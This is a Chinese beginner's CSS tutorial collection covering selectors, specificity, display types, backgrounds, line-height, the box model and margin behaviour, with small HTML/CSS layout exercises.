[overflow-溢出](overflow-溢出.md)
[定位](定位.md)
[图片和文字居中对齐](图片和文字居中对齐.md)
[设置logo图片点击跳转](设置logo图片点击跳转.md)
[css 可见性](css可见性.md)
[精灵图](精灵图.md)
[滑动门](滑动门.md)
[css综合案例](css综合案例.md)

CSS 指层叠样式表 (Cascading Style Sheets)(级联样式表)
Css是用来美化html标签的，相当于页面化妆。

**◆样式表书写位置**
![](https://box.kancloud.cn/24ae846518b94f8cdc9a0edad284d9b3_405x175.png)
| 属性   |解释    |
| --- | --- |
|  ` Width:20px;`| 宽   |
|  ` Height:20px;` |高    |
| ` Background-color:red;`  |  背景颜色  |
|  ` font-size:24px;` | 文字大小   |
| `  text-align:left | center| right` |  内容的水平对齐方式  |
| `text-indent:2em; `  |  首行缩进 ,以汉字为缩进 |
| `Color:red; `  |   文字颜色 |

[TOC=1,5]
>[success] ## **一、属性预览表**

|  属性  |解释    |
| --- | --- |
|` font-size:16px; `  |   文字大小 |
| ` Font-weight: 700`  | 值从100-900，文字粗细，不推荐使用font-weight:bold;   |
| `Font-family:微软雅黑 `  |文本的字体    |
|  `Font-style: normal | italic;`  | normal 默认值  italic  斜体   |
|   ` line-height:` | 行高   |

<br>

>[success] ##  **二、属性连写方式**
`font: font-style font-weight  font-size/line-height  font-family;`

#### **备注**：
```
font:后边写属性的值。一定按照书写顺序。
文本属性连写文字大小和字体为必写项。
```
#### **案例**

`Font:italic 700 16px/40px  微软雅黑;`

<br>

>[success] ##  **三、文本字体表达方式**

1.直接写中文名称
![](https://box.kancloud.cn/c5e5d8cdf405a406e48680cd28795f0f_403x121.png)

3.英文方式
![](https://box.kancloud.cn/9ab5c7e90244cc19dc952dd0f2c043e6_523x114.png)
3.unicode 编码
![](https://box.kancloud.cn/1321d15805f4157965952acf63c1b313_424x437.png)

第一步：f12
第二步：找到console
第三步：输入escape(“宋体”)  注意英文的括号和双引号。
![](https://box.kancloud.cn/dfc732dcb8424df373cf56a5ee3a05d8_566x213.png)
[TOC=2]
>[success] ## **内嵌式写法**
####  **用法**
```
<head>
<style type=”text/css”>
样式表写法
</style>
</head>
```

#### **特点**
```
内嵌式写法，样式只作用于当前文件，没有真正实现结构表现分离
```
<br>

>[success] ## **外链式写法**
####  **用法**
```
写在head里，<link rel=”stylesheet” href=”1.css”>
```
#### **特点**
```
作用范围是当前站点，谁调用谁生效，范围广，真正实现结构表现分离。
```
![](https://box.kancloud.cn/1f3b41a74c253d8dda862e1f113c89e0_535x63.png)

<br>

>[success] ## **行内样式表**
####  **用法**
![](https://box.kancloud.cn/ace7464b70746f2a958b4ca8a7ffda71_717x81.png)
#### **特点**
`行内样式表，作用范围仅限于当前标签，范围小，结构表现混在一起。  （不推荐使用）`
[1.1基础选择器](基础选择器.md)
[1.2复合选择器](３.2复合选择器.md)
[标签选择器](标签选择器.md)

[TOC=2]


## **标签选择器**
#### **用法**
`标签{属性：值;}`

### **特点**
`标签选择器定义之后，会将页面所有的元素都执行这个标签样式。`

#### **使用截图**
![](https://box.kancloud.cn/22f907be670379b9e924ed03da0bc9a2_390x317.png)


</br>

## **类选择器**
#### **用法**
`.自定义类名{属性:值;  属性:值；}`

#### **特点**
```
谁调用，谁生效。
一个标签可以调用多个类选择器。
多个标签可以调用同一个类选择器。
```
#### **常用的命名**
```
不能用纯数字或者数字开头来定义类名
不能使用特殊符号或者特殊符号开头（_）来定义类名
不建议使用汉字来定义类名
不推荐使用属性或者属性的值来定义类名
```
![](https://box.kancloud.cn/2f88e8c818ab17764c06daf176397d6d_288x424.png)


#### **使用截图**
![](https://box.kancloud.cn/84924b3452694ecef9091791551e17c4_412x268.png)

</br>

## **ID选择器**
### **用法**
`#自定义名称{属性:值;}`

### **特点**
标签选择器定义之后，会将页面所有的元素都执行这个标签样式。


```
一个ID选择器在一个页面只能调用一次。
如果使用2次或者2次以上，不符合w3c规范，JS调用会出问题。
一个标签只能调用一个ID选择器。
一个标签可以同时调用类选择器和ID选择器。

```
### **使用截图**
![](https://box.kancloud.cn/40a430cfbd8f971dbe22d26e3d55ffab_407x264.png)

</br>

## **通配符选着器**
### **用法**
`*{属性:值;}`

### **特点**
给所有的标签都使用相同的样式。。


```
不推荐使用，增加浏览器和服务器负担。
```

## **展示效果**
![](https://box.kancloud.cn/e4b1057f6df7dcf48dc1992d9273dd9d_743x256.png)
```

<head>
	<title></title>
</head>
	<style type="text/css">
		.g{
			font-size: 200px;
			color: #000099;
		}

		.o1{
			font-size: 200px;
			color: #990000;
		}

		.o2{
				font-size: 200px;
				color: orange;
			}

		.g1{
			font-size: 200px;
			color: #990000;
		}
		.l{
			font-size: 200px;
			color: #009900;
		}
		.e{
			font-size: 200px;
			color: #990000;
		}
	</style>	
<body>
	<span class="g">G</span>
	<span class='o1'>o</span>
	<span class='o2'>o</span>
	<span class='g'>g</span>
	<span class='l'>l</span>
	<span class='e'>e</span>
</body>
</html>
[TOC=2]


## **交集选择器**
#### **用法**
`标签+类（ID）选择器{属性：值；}`

### **特点**
`即要满足使用了某个标签，还要满足使用了类（id）选择器。`

#### **使用截图**
![](https://box.kancloud.cn/71d13b4ebf4872f3252037c0cf66099a_388x239.png)

<br>

## **后代选着器**
#### **用法**
`选择器+空格+选择器{属性：值;}`

### **特点**
```
后代选择器首选要满足包含（嵌套）关系。
父集元素在前边，子集元素在后边。
无限制隔代。
只要能代表标签，标签、类选择器、ID选择器自由组合。
```

#### **使用截图**
![](https://box.kancloud.cn/f1bdf0a8d4885c92e33954f1035d906f_521x255.png)

<br>

## **子代选择器**
#### **用法**
`选择器>选择器{属性:值;}`

### **特点**
`指定子代`

#### **使用截图**
![](https://box.kancloud.cn/5101a1d78c0b47772f95e45fb2ed39ba_302x269.png)![]

<br>

## **并集选择器**
#### **用法**
`选择器+，+选择器+，选择器{属性:值;}`



#### **使用截图**

![](https://box.kancloud.cn/58a321246f9908526d64dbc052d61e41_338x240.png)
一、展示
=
![](https://box.kancloud.cn/6c4ef8c84c1a3972424f4a291ff82c0e_1262x141.png)



二、代码
=

```
<head>
	<title></title>
</head>
	<style type="text/css">
		
		div.concent{
			width: 800px;
			margin: 0 auto;
		}
		.concent h1{
			font-size: 28px;
			text-align: center;

		}
		.concent .box{
			text-align: center;
		}
		.time,.news{
			font-size: 14px;
		}
		.time{
			color: rgb(150,150,150);
		}
		.news{
			color: #990000;
		}
		.box input[type=text]{
			color: red;
		}
	</style>	
<body>
<div class='concent'>
	<h1>中乙比赛</h1>
	<div class='box'>
		<span class='time'>2018.4.9</span>
		<span class='news'>体育频道</span>
		<a href="#">收藏文章</a>
		<input type='text' value='请输入内容'>
		<input type='submit'>
	</div>
	<hr>
	<div></div>
<div>
</body>
</html>
```
>[success] # 标签选择器

![](https://box.kancloud.cn/43ffa8d308a94c846ee3e687a223d1a8_496x349.png)

>[danger] ##### 简写

![](https://box.kancloud.cn/90d5a377955a4361c9b1523366ae0c46_483x196.png)
[TOC=2]
>[success] ## **层叠性**
#### **特点**
```
当多个样式作用于同一个（同一类）标签时，
样式发生了冲突，总是执行后边的代码(后边代码层叠前边的代码)。
和标签调用选择器的顺序没有关系。
```
![](https://box.kancloud.cn/877d48fc6d8d995df4554cc3937d87ff_411x314.png)

<br>


>[success] ## **继承性**
#### **特点**
```
继承性发生的前提是包含（嵌套关系）
   ★文字颜色可以继承
   ★文字大小可以继承
   ★字体可以继续
   ★字体粗细可以继承
   ★文字风格可以继承
   ★行高可以继承

```
#### **特殊情况**
```
h系列不能继承文字大小。
a标签不能继承文字颜色。
```

![](https://box.kancloud.cn/5b9dc503bd2f91884f8175e7ef0c6847_391x314.png)


<br>

>[success] ## **优先级**
#### **特点**
```
默认样式<标签选择器<类选择器<id选择器<行内样式<!important 

```
#### **特殊情况**
```
h系列不能继承文字大小。
a标签不能继承文字颜色。
```

#### **特点**
```
★继承的权重为0,指定自己样式，直走自己的样式
★权重会叠加
```

![](https://box.kancloud.cn/4e3338d1b7545f9ac707521ceb88aa47_606x291.png)

[TOC=2]

>[success] ## **块元素**
####  **代表标签**
```
Div,h1-h6,p,ul,li
```
#### **特点：**
```
★独占一行
★可以设置宽高
★ 嵌套（包含）下，
子块元素宽度（没有定义情况下）和父块元素宽度默认一致。

```

<br>

>[success] ## **行内元素**
####  **代表标签**
```
span  ,a,  ,strong , em,  del,  ins
```
#### **特点：**
```
★在一行上显示
★不能直接设置宽高
★元素的宽和高就是内容撑开的宽高。
```

<br>

>[success] ## **行内块元素(内联元素)**
####  **代表标签**
```
input  img
```
#### **特点：**
```
★在一行上显示
★可以设置宽高
```

<br>

>[success] ## **元素间的转换**
**块元素转行内元素 div-->span**
`display:inline`
![](https://box.kancloud.cn/eab29face7dff9cef262505eb1cf4593_398x156.png)

<br>

**行内元素转块元素**
`display:block;`
****
![](https://box.kancloud.cn/0f7a08186e9eef7d094a12e008ff4686_308x123.png)
<br>

**块和行内元素转行内块元素**
`display:inline-block;`
![](https://box.kancloud.cn/ec3a68e1de34eca79f53563301e27a95_489x236.png)

>[danger] ##### 特点

1 行内元素不能设置宽高， 
2 行内块元素可以设置宽高，并不单独占据一整行，也不”继承”宽度 
3 块级元素本来就是要占据一整行显示，如果父元素设置了宽度，那么子元素在没有设置宽度的前提下默认和父元素同宽。 
|   用法 |解释    |
| --- | --- |
|  a:link{属性:值;}  |  链接默认状态  |
|   a:visited{属性:值;} | 链接访问之后的状态   |
| a:hover{属性:值;}   |    鼠标放到链接上显示的状态  |
| a:active{属性:值;}    |  链接激活的状态  |
|  ：focus{属性:值；}   |   获取焦点 |

去掉a标签的下划线
`text-decoration: none  |   underline   |     line-through![]`
![](https://box.kancloud.cn/773955af3cfbdaf861c3bc49f4727659_388x377.png)
![](https://box.kancloud.cn/449e8c86b4373ed2e2da086111b14ce4_1351x69.png)

代码
```
<head>
	<title></title>
</head>
	<style type="text/css">
	
		div.nav{
			height: 60px;
			background-color: #aaa;
			text-align: center;
		}

		a{
			display: inline-block;
			width: 80px;
			height: 60px;
            
            /**去掉下划线**/
			text-decoration:none;
			color: red;
			
		}
        /**鼠标经过的样式**/
		a:hover{
			background-color: yellow;
			color: black;
		}

	</style>	
<body>
	<div class='nav'>
		<a href="#">标题一</a>
		<a href="#">标题二</a>
		<a href="#">标题三</a>
		<a href="#">标题四</a>
	</div>
</body>
</html>
```
>[success] # 图标转换案例

>[danger] ##### 效果
**页面展示效果**
![](https://box.kancloud.cn/1759c7704efba1dd9192583adff5a211_131x68.png)
**放上鼠标后**：
![](https://box.kancloud.cn/01de919befc92e744764aff28afc1890_132x68.png)

>[danger] ##### 分析：

>图片高为64，即一个图片的单个高度为32，所以设置一个67*32的盒子，这样初始的时候展示的是购物车，在设置鼠标 悬停后的图片位置，这样显示的就是登陆

![](https://box.kancloud.cn/8266c86f0100bf43330c35a41b29475e_579x126.png)

>[danger] ##### 代码
```
<head>
	<title></title>
</head>
	<style type="text/css">
	 a{
	 	display: inline-block;
	 	background: url(110.png);
	 	width: 67px;
	 	height: 28px;
	 }
	 a:hover{
	 	background: url(110.png) bottom;
	 }
	</style>	
<body>
	<a href=""> </a>
</body>
</html>
```
| 属性   |介绍    |
| --- | --- |
|background-color   |  背景颜色  |
| background-image   |  背景图片 |
| background-repeat   | 背景平铺   |
| Background-position   | 背景定位 |



>[success] ## 一、介绍


[TOC=4]


* * * * *


>[danger]#### **background-image**
```
background-image: url();
```
<br>

* * * * *

>[danger]#### **background-repeat** 平铺效果
```
 repeat(默认)   平铺铺满,针对div来决定
 no-repeat      只展示一个
 repeat-x       x背景平铺
 repeat-y       y背景平铺
```

<br>


* * * * *

>[danger]#### **background-position** 图片位置
```
 left  |  right  |  center  |  top  | bottom 
```
★方位值只写一个的时候，另外一个值默认居中。也就是当只写右面属性，是紧贴右面的中间
```
background-pasition: right;
等同于
background-pasition: right center;
```
★写2个方位值的时候，顺序没有要求。
```
background-pasition: right bottom; 右下角
```
★写2个具体值的时候，第一个值代表水平方向，第二个值代表垂直方向。
```
background-pasition: 20px 30px; 左右 位置  和上下位置
```

<br>

* * * * *


>[danger]#### **Background-attachment** 滚动效果
```
scroll 固定位置  
fixed 相对于web浏览器位置，而不是div，所以视觉上有滚动
```

>[danger]#### **属性连写**
★：连写的时候没有顺序要求，url为必写项。
![](https://box.kancloud.cn/9fb33b46656fe8c4ffdb75dee7548396_671x82.png)
![](https://box.kancloud.cn/785e16117d5a8e0a5860e7b0d612dae9_359x82.png)
代码：
内块标签所以直接设置，背景图片宽高
```
<head>
	<title></title>
</head>
	<style type="text/css">
	 input{
	 	width: 280px;
	 	height: 30px;
	 	background:url('serch.jpg') right no-repeat;
	 }

	</style>	
<body>
	<input type='text'>
</body>
</html>
```
![](https://box.kancloud.cn/6d84ce8291acc5b536068d442a278e64_136x67.png)
代码
```
<head>
	<title></title>
</head>
	<style type="text/css">
	 li{
	 	/*清除列表符号*/
	 	list-style: none;
	 	background:url(serch.jpg) no-repeat left center;
        /*为了设置图片和文字距离*/
	 	text-indent: 1em;
	 }

	</style>	
<body>
	<ul>
		<li> 案例</li>
		<li> 案例</li>
	</ul>
</body>
</html>
```
>[success] # 背景时候的案例分析

![](https://box.kancloud.cn/af8c6ee24c5ec5a39cf1aa69de33abe3_836x353.png)


![](https://box.kancloud.cn/8ec119d6138b9ddc0e8a44b3d3c5ea08_594x405.png)
[TOC=1,5]
>[success] # 行高定义

>行高：是基线与基线之间的距离,什么是基线?这个定义来自于英文字母中用到的一个概念，是一个四线本子，四条线分别是顶线，顶线，基线，底线，在实际中文中没有基线这个概念，两行英文基线和基线的距离的行高等同于顶线到底线的距离
>![](https://box.kancloud.cn/3fc8c2396892dfd582260d32714e73f1_513x138.png)
>![](https://box.kancloud.cn/634882fc6ca7904a43a91811f6b3bf57_540x214.png)
>所以默认情况下文字大小小于行高

<br>

* * * * *

>[danger] ##### **总结**
```
行高：是基线与基线之间的距离
行高=文字高度+上下边距
撑起div块的高度是行高，而不是文字高度
```

>[danger] ##### 浏览器的默认文字大小：16px


* * * * *

>[danger] ##### 如何设置文字垂直居中

>将行高和div高度一致，也就是说一行文字行高和父元素高度一致的时候，垂直居中显示。原因是文字是垂直居中行高，所以这样也就垂直居中了，父级

![](https://box.kancloud.cn/cd75d7a83a1ed6fc2990d3826bdf50a4_670x280.png)

* * * * *
<br>

>[danger]  ##### 文字和行高的单位关系

>高度单位除了px，还有em，%，倍数他们和文字之间的关系如何

|  单位  | 文字大小   | 值   |
| --- | --- | --- |
|  px  |  20px  | 20px   |
|  2em |  20px  |  40px  |
|  150% |   20px |  30px  |
|  2 |  20px  |  40px  |
**案例：**

![](https://box.kancloud.cn/19359da77bc91321ba590c28e4d33769_467x103.png)
```
<head>
	<title></title>
</head>
	<style type="text/css">
	.one{

		font-size: 20px;
		line-height: 2em;		
	}
	</style>	
<body>
	
	<div class="one">行高40</div>
	
</html>
```
**总结:**

>单位除了像素以为，行高都是与文字大小乘积。

* * * * *
<br>

>[danger]  ##### 继承关系时文字和行高的单位关系

|  行高  |父元素文字大小    | 子元素大小   |行高    |
| --- | --- | --- | --- |
|  40px  | 20px   | 30px   | 40px   |
|   2em |   20px | 30px   | 40px   |
|   150% |  30px  |30px    | 45px   |
|  2  |  20px  | 30px   | 40px   |
**案例：**

>[danger] **当px为单位时候**

![](https://box.kancloud.cn/dacea15770b67dbfe7e9e933a04c380e_535x113.png)
**代码**
![](https://box.kancloud.cn/f48f4373ee8ff46d082232e8afa66362_591x395.png)

<br>

* * * * *
>[danger] **当其他单位的时候**

![](https://box.kancloud.cn/c12a11e0b4890710aa458f32fb1d1c4a_454x98.png)
**分析：**
继承关系，所以父类做了行高计算，子类继承，不会出现交叉积
![](https://box.kancloud.cn/0872d9960e5ae3b979b52e39dbf0883f_525x373.png)

**总结：**

>不带单位时，行高是和子元素文字大小相乘，em和%的行高是和父元素文字大小相乘。行高以像素为单位，就是定义的行高值。

>◆推荐行高使用像素为单位
[TOC=1,5]
>[success] # 案例
![](https://box.kancloud.cn/43fc387bc2bd36307501c4d2a48f7f1b_126x66.png)

>[danger] ##### 思路

>图片的高58px,宽120px，把a 标签设置成内联标签，设置宽高50*120，文字水平居中是根据行高决定的，又因为图片下三角高8px，因此设置行高为50px ，文字样式text-align为center

>[danger] ##### 代码

```
<head>
	<title></title>
</head>
	<style type="text/css">
	.one{
		text-align: center;
		line-height: 50px;
		height: 58px;
		width: 120px;
		display: inline-block;
		background :url(./images/bg1.png);
	}
	</style>	
<body>
	
	<a class="one" href="">cea</a>
	<a class="two" href=""></a>
	<a class="three" href=""></a>
	
</html>
```
[TOC=1,5]
>[success] # 什么是盒子模型

> ![](https://box.kancloud.cn/9d69fff312994181cc9481d62164060d_455x291.png)
> 可以抽象的想象成上图的样子，盒子模型分是个部分组成外边距（margin）、边框（border）、内边距（padding）、内容（content）四个属性


[TOC=1,5]
>[success] # 边框的属性介绍-border

|属性    | 介绍   |   
| --- | --- | 
|  `Border-top-style`  |边框线的风格，其中top可以是right/bottom/left,可是solid实线，dotted 点线，dashed虚线    |    
|` Border-top-color ` |边框颜色    |   
|`Border-top-width `   | 边框粗细   |    

>[danger]  ##### 属性案例

![](https://box.kancloud.cn/d3992f31f8cf9c177b377f8a78f596da_511x420.png)

>[danger]  ##### 案例效果展示

![](https://box.kancloud.cn/76fb9537e8053cc727d7346147618ec2_554x350.png)

>[danger] ##### 边框的属性连写-格式

>特点：没有顺序要求，线型为必写项
>![](https://box.kancloud.cn/d2d3d6c3d0720cc6dda4a8d9c4eb6b85_379x67.png)

>四个边框值相同的写法
>![](https://box.kancloud.cn/d3e395085db8b29ed66a87f92eed01a1_486x74.png)


>[success]  # 边框合并
  
>[danger] ##### 边框合并属性-border-collapse:collapse（collapse-折叠）

**未使用时：**

![](https://box.kancloud.cn/3312bc2f195ddfb8305ec229c442bfd0_498x477.png)

**未使用效果：**
![](https://box.kancloud.cn/1426d068e7155ea7d1dcccc4eac4f614_365x334.png)

* * * * *
<br>

**使用后的效果：**
![](https://box.kancloud.cn/cd6465e6d48ae1e2e0107fd9b3613d8e_328x159.png)

![](https://box.kancloud.cn/65d84def91100366ecdca155a6ba0a6b_313x319.png)
>[info] ## 涉及到focus 获取光标，input边框

**效果：**
![](https://box.kancloud.cn/ab0e592346a7c35e0dd84f578fed8f05_284x108.png)

**代码：**
```
<head>
	<title></title>
</head>
	<style type="text/css">
	#username{
				border:0 none;
		outline: none;		
		background:#ccc;
		border: 1px dashed green;
	}
	#username:focus{
		background:red;

	}

	#email{
		border: 0 none;
		outline:none;
		border-bottom: 1px red dashed;
	}
	</style>	
<body>
用户名：<input type="text" id="username">
</br>
邮箱：<input type="text" id="email">
<br>
密码：<input type="text" id="pwd">
</html>
```

**讲解：**
![](https://box.kancloud.cn/94b2cae9102f51741d6a3fdfcbfa09ab_507x320.png)
>[success] # 内边距-padding

> 内容距离边框-boder之间的距离

>[danger]  ##### 内边距-padding 距离调整

>![](https://box.kancloud.cn/ed3025258c1b1a5ad13cd9f74ed90a76_420x210.png)


|  属性  | 注解    |
| --- | --- |
| padding-left |   表框距离内容左面距离 |
|   padding-right |  表框距离内容右面距离  |
|   padding-top |  表框距离内容上面距离 |
|  padding-bottom  |   表框距离内容下面距离 |

 **代码**
```
<head>
	<title></title>
</head>
	<style type="text/css">
	.box{
		
		padding-left: 10px;
		padding-right: 10px;
		padding-top: 10px;
		padding-bottom: 10px;
	}


	</style>	
<body>
	<div class="box">
		<span>内容<span>
	</div>
</html>
```
**效果：**
![](https://box.kancloud.cn/c29dd11be6eba1dc61b2d6464ed2cefa_398x248.png)

>[danger]  ##### 内边距-padding 简写

>Padding: 20px;   上右下左内边距都是20px
>Padding: 20px 30px;   上下20px   左右30px
>Padding: 20px  30px  40px;   上内边距为20px  左右内边距为30px   下内边距为40
>Padding:  20px  30px   40px  50px;   上20px 右30px  下40px  左  50px


* * * * *
<br>

>[success] #  内边距影响盒子大小

>[danger] ##### 内边距会将盒子模型撑大

**案例：**
现在有一个图片是200* 200，有一个div是300*300，现在想让图片居中，正常我们的想法是用text-align: center;让内容居中，如果只是调整padding居中，可能的想法是（300-200）/2=50,调整内边距50px
```
<head>
	<title></title>
</head>
	<style type="text/css">
	.box{
		width: 300px;
		height: 300px;
		background-color: green;

	}


	</style>	
<body>
	<div class="box">
		<img src="0.jpg">
	</div>
</html>
```
![](https://box.kancloud.cn/fb354436f0a20d28d4fcde3c45388000_347x355.png)

**按照分析调整像素五十个px效果：**
![](https://box.kancloud.cn/f589278cdd9dbe6e87b6b3b3a64a8588_422x153.png)
**页面效果**：
发现盒子变大了50px像素，因此不能用直接在原div基础上做，增加
![](https://box.kancloud.cn/faaceaa290231e814d136aa24f49de0e_366x380.png)

>[danger] ##### 影响盒子大小条件/解决方法

>上面问题的解决方法：
>因为内边距加大了50px，我们在原基础300-50px 相当于250px，盒子的大小是现在定义的250+左内边距的50=300px
>![](https://box.kancloud.cn/dacabc19d5e32fa3eaf6a7c224528de4_413x168.png)

**结论：**
1.内边距影响盒子的宽度
2.边框影响盒子的宽度，盒子50px宽，边框10px 则盒子宽度70px

盒子的宽度=定义的宽度+边框宽度+左右内边距


* * * * *
<br>

>[danger] ##### 继承的盒子一般不会被撑大

>包含（嵌套）的盒子，如果子盒子没有定义宽度，给子盒子设置左右内边距，一般不会撑大盒子。

>![](https://box.kancloud.cn/48bea39795717558066c818db513fde8_581x346.png)
padding 影响的是内容 对块元素没有影响，绿色继承了 红色快的属性内容内边距100px
```
<head>
	<title></title>
</head>
	<style type="text/css">
	.box{
		width: 500px;
		height: 300px;
		background-color: red;
		

	}
	.son{
		height: 100px;
		background-color: green;
		padding-left: 100px;
		padding-top: 100px;
	}

	</style>	
<body>
	<div class="box">
		<div class="son">1111</div>
	</div>
</html>
```

**超过父类**
超过父类的时候，水平时候父类盒子没有变化，垂直父类盒子会变大
![](https://box.kancloud.cn/3a05653f744230c511254f013c6ef9b5_623x314.png)

![](https://box.kancloud.cn/2ed49e9626d96c02551fb51bba2a0f5f_1352x68.png)

>[success] # 讲解

![](https://box.kancloud.cn/906f8bdb98128b06f06c0839a0b13ed4_591x406.png)

```
<head>
	<title></title>
</head>
	<style type="text/css">
		.nav{
			border-top: red 2px solid;
			 height: 50px;
			background:#eee;
		}
		.nav .nav-con{
			margin: 0 auto;
			width: 1000px;
			height: 50px;

		}
		a{
			display: inline-block;
			line-height: 50px;
			height: 50px;
			text-decoration: none;
			padding: 0 12px;
		}
		a:hover{
			background-color:#999; 
		}
	</style>	
<body>
	<div class="nav">
		<div class="nav-con">
			<a>设置首页</a>
			<a>手机新浪网</a>
			<a>移动客户端</a>
		</div>
	</div>
</html>
```

[TOC=1,5]
>[success] # 外边距-margin

>就是块和块之间边的距离，简单理解

>[danger] ##### 外边距属性-margin

|  属性  | 注解    |
| --- | --- |
| margin-left |    块之间左面边距离 |
|   margin-right |   块之间右面边距离  |
|   margin-top |   块之间上面边距离 |
|  margin-bottom  |   块之间下边面距离 |

* * * * *
<br>

>[danger] ##### 外边距属性连写-margin

>Margin: 20px;    上下左右外边距20PX
Margin: 20px 30px;   上下20px  左右30px
Margin: 20px  30px  40px;     上20px  左右30px   下  40px
Margin: 20px  30px   40px  50px; 上20px   右30px   下40px  左50px


* * * * *

<br>

>[danger] ##### 垂直方向外边距合并

```
<head>
	<title></title>
</head>
	<style type="text/css">
		.box1{
			width: 500px;
			height: 200px;
			background-color: black;
			margin-bottom: 10px; 
		}
		.box2{
			width:500px;
			height: 200px;
			background-color: yellow;
			margin-top: 20px; 

		}
	</style>	
<body>
	<div class="box1"></div>
	<div class="box2"></div>
</html>
```
>◆垂直方向外边距合并两个盒子垂直一个设置上外边距，一个设置下外边距，取的设置较大的值。
>![](https://box.kancloud.cn/21c3688457079d2bd77823f1924adae7_722x434.png)



* * * * *
<br>

>[danger] ##### 嵌套的盒子外边距塌陷

![](https://box.kancloud.cn/1e31b4b799d3385322146154267d566b_498x448.png)

>![](https://box.kancloud.cn/eb0af51da101dbc68253c5cda6e8220e_583x239.png)

**解决方法：**
1  给父盒子设置边框
2 给父盒子overflow:hidden;   bfc   格式化上下文

>补充知识什么是bfc
>BFC全称”Block Formatting Context”, 中文为“块级格式化上下文”。
BFC元素特性表现原则就是，内部子元素再怎么翻江倒海，翻云覆雨都不会影响外部的元素。

![](https://box.kancloud.cn/7f6b4f3ab2bd5d7cd4f5db02e680a565_546x422.png)
>[success] ##### 行内元素可以定义左右的内外边距，上下会被忽略掉



>[success] ##### 行内块可以定义内外边距 


[综合案例一](综合案例.md)
[综合案例二](综合案例二.md)
[综合案例三](综合案例三.md)

>[success] # 综合案例

>[danger]效果图

![](https://box.kancloud.cn/d1a313441f032e8bd2092db9f837c518_295x217.png)

>[danger] ##### 代码


```
<head>
	<title></title>
</head>
	<style type="text/css">
		.news{
			width: 238px;
			height: 166px;
			border: 1px solid #D9E0EE;
			border-top:3px solid #FF8400;
			margin: 0 auto;
			overflow: hidden;
		
		}
		.news-title{
			height: 35px;
			border: 1px solid #D9E0EE;
			line-height: 35px;
			padding-left: 12px; 
		}
		ul,li{
			list-style: none;
			margin: 0 ;
			padding:0;
		}
		ul{
			margin-top:14px; 
		}
		li{
			padding-left: 19px;
			height: 23px;
		}
	</style>	
<body>
	<div class="news">
	<div class="news-title">行业动态</div>
	<div class="box3">
		<ul>
			<li>1111</li>
			<li>2222</li>
		</ul>
	</div>
	</div>
</html>
```

* * * * *

>[danger] ##### 讲解
1.ul 内边距去除
![](https://box.kancloud.cn/8312af4c259c9a4313ed99f5e87de321_236x126.png)
2.ul 和每行之间li的外边距去除
![](https://box.kancloud.cn/fc4590e1fe5ea14fbf2756f31836bbcc_283x168.png)
3.行高  两行顶线之间的距离
![](https://box.kancloud.cn/3cb0bd93c0f2500224322eae9143e0bf_174x81.png)


* * * * *
![](https://box.kancloud.cn/498bccfd2f4a728b7654e992de76ad77_688x517.png)
[TOC=1,5]

>[success] # 案例讲解

>[danger] ##### 案例效果

![](https://box.kancloud.cn/95235e985d84e070fb42c95fa4f42d05_273x339.png)


* * * * *
<br>

>[danger] ##### 案例分析


```
1.案例拆分三个模块
2.第一模块整体div
3.第二模块标题div
4.ul 模块布局
```
整体div
![](https://box.kancloud.cn/9317d9a05b5461d23079beab9caa73d4_280x348.png)

* * * * *
标题div
![](https://box.kancloud.cn/6564c38c99bbf71005ae6cd74a4b61c9_256x52.png)

* * * * *
ul模块
![](https://box.kancloud.cn/82dc5c5a06b0af343446e282d50c4b3a_244x288.png)

>[danger] ##### CSS 样式分析

```
1.外层div 宽260px 高327px ，边框属性 1px，颜色#009900
2.标题div 高23px 外边距 10 0 5 10，内联10 px
3.ul 高279px 宽240px
4.li 高30px
```


>[danger] ##### 代码分析

* * * * *

**最外层的box设置：**
![](https://box.kancloud.cn/8d2a10e78cf9c37635016f066133fefc_508x113.png)


* * * * *
**title设置：**

![](https://box.kancloud.cn/0258f2b039495da374889a743bc63a51_519x153.png)



* * * * *

**ul设置：**
![](https://box.kancloud.cn/abb48e262ca371314c0bbbeb362a87d2_450x326.png)

>[danger] ##### 代码

```
<head>
	<title></title>
</head>
	<style type="text/css">
		.box{
			width:260px;
			height:327px;
			border:1px #009900 solid;
			background:url(bg.gif);
		}
		.title{
			height:23px;
			border-left:3px solid green;
			margin: 10 0 5 10;
			font:16px/23px 微软雅黑;
			color: #fff;
			padding: 0 10px;
		}
		ul,li{
			margin:0px;
			padding:0px;
		}
		ul{
			height: 279px;
			width: 220px;
			margin: 0px 10px;
			background:#fff;
			padding:0 10px;

		}
		li{
			list-style: none;
			height: 30px;
			line-height: 30px;
			border-bottom: 1px  #666 dashed; 
		}
	</style>	
<body>
	<div class="box">
		<div class='title'>宠物医院</div>
		<ul>
			<li>1</li>
			<li>2</li>

		</ul>
	</div>
</html>
```

[TOC=1,5]

>[success] # 案例讲解

>[danger] ##### 案例效果

![](https://box.kancloud.cn/efc8ac493fd5eae0e82ca2afa32f093d_256x415.png)

* * * * *
<br>

>[danger] ##### 案例分析

```
1.案例拆分六个模块
2.第一模块整体div-box
3.第二模块标题div-title
4.第三模块图片div-pic
5.第四模块名字div-blink
6.第五模块测试按钮div-weibo
7.第六模块四个按钮div-friend
```
![](https://box.kancloud.cn/32fdb3cd57ecfb774c23182ab59df333_430x432.png)


* * * * *
>[danger] ##### 代码分析


![](https://box.kancloud.cn/26205987f2d17abeedd7443181fe8c9c_637x352.png)

![](https://box.kancloud.cn/7b1bf2dd4457b1a29bd14ad501574895_628x425.png)
* * * * *
<br>

>[danger] ##### 代码
```
<head>
	<title></title>
</head>
	<style type="text/css">
		.box{
			width: 208;
			height: 384;
			border:1px solid #cecece;

		}
		.box .title{
			padding-left: 9px;
			background:#cecece;
			font: 14px/25px 微软雅黑;
		}
		.box .pic{
			width: 180px;
			height: 180px;
			border:1px solid #cecece;
			margin: 10px 0 11px 13px;

		}

		.box .blink{
			height: 27px;
			text-align: center;

		}
		.box .weibo{
			height: 33px;
			text-align: center;
			border-bottom: 1px dashed #cecece;
			margin-bottom: 20px;
		}
		.box .weibo input{
			width: 68px;
			height: 23px;
		}
		.box .friend{
			text-align: center;
		}
		.box .friend input{
			width: 67px;
			height: 21px;
			margin-bottom: 5px: 
		}
	</style>	
<body>
	<div class="box">
		<div class="title">个人资料</div>
		<div class='pic'>
			<img src="1.jpg">
		</div>
		<div class='blink'>
			v未必
		</div>
		<div class='weibo'><input type="button" value="测试"></div>
		<div class='friend'>
			<input type="button">
			<input type="button">
			<input type="button">
			<input type="button">

		
		</div>	
	</div>
</html>
```
>[success] # 文档流定义

元素自上而下，自左而右，块元素独占一行，行内元素在一行上显示，碰到父集元素的边框换行。

